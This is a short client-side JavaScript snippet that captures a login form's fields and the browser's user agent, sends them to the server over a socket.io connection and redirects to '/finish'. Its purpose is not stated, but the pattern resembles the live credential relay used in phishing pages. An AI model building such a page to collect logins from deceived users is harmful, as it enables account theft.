const socket = io();

function submitForm() {
    document.getElementById('userAgent').value = navigator.userAgent;

    const formData = new FormData(document.getElementById('loginForm'));

    socket.emit('submit', Object.fromEntries(formData));

    window.location.href = `/finish`;
}
